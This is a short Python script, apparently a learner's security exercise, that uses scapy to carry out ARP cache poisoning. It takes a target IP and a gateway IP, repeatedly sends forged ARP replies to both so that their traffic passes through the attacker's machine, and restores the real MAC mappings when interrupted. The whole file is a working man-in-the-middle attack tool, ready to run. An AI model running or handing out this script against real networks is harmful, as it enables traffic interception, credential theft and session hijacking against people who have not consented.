import scapy.all as scapy
import optparse
import time

def get_input():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="put target ip in !!")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="put gateway ip in !!")
    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("enter target ip")
    if not options.gateway_ip:
        print("enter gateway ip")

    return options

user_input = get_input()
user_target_ip = user_input.target_ip
user_gateway_ip = user_input.gateway_ip


def get_mac(input_ip_range):
    arp_request_packet = scapy.ARP(pdst=input_ip_range)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

    lower = answered_list[0][1].src
    up = lower.upper()
    return up

def arp_poisoning(target_ip,poisoned_ip):
    target_mac = get_mac(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)


def reset_op(fooled_ip,gateway_ip):
    fooled_mac = get_mac(fooled_ip)
    gateway_mac = get_mac(gateway_ip)
    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)

number = 0
try:
    while True:
        print("\rsending packets",str(number),end="")
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        number += 2
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit and reset")
    reset_op(user_target_ip,user_gateway_ip)
    reset_op(user_gateway_ip,user_target_ip)

"""

el0

"""